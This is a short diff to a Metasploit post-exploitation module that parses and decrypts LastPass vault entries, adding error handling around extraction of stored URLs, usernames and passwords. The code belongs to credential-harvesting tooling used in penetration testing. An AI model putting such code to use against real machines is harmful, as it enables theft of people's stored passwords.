@@ -697,12 +697,17 @@ class Metasploit3 < Msf::Post
     labels = ["name", "folder", "url", "notes", "undefined", "undefined2", "username", "password"]
     vault_data = []
     for label in labels
-      length = chunk[pointer..pointer + 3].unpack("H*").first.to_i(16)
-      encrypted_data = chunk[pointer + 4..pointer + 4 + length - 1]
-      label != "url" ? decrypted_data = decrypt_vault_password(vault_key, encrypted_data) : decrypted_data = [encrypted_data].pack("H*")
-      decrypted_data = "" if decrypted_data.nil?
-      vault_data << decrypted_data if (label == "url" || label == "username" || label == "password")
-      pointer = pointer + 4 + length
+      begin
+        length = chunk[pointer..pointer + 3].unpack("H*").first.to_i(16)
+        encrypted_data = chunk[pointer + 4..pointer + 4 + length - 1]
+        label != "url" ? decrypted_data = decrypt_vault_password(vault_key, encrypted_data) : decrypted_data = [encrypted_data].pack("H*")
+        decrypted_data = "" if decrypted_data.nil?
+        vault_data << decrypted_data if (label == "url" || label == "username" || label == "password")
+        pointer = pointer + 4 + length
+      rescue
+        vprint_error "Vault account could not be parsed"
+        return nil
+      end
     end
     return vault_data[0] == "http://sn" ? nil : vault_data # TODO: Support secure notes
   end
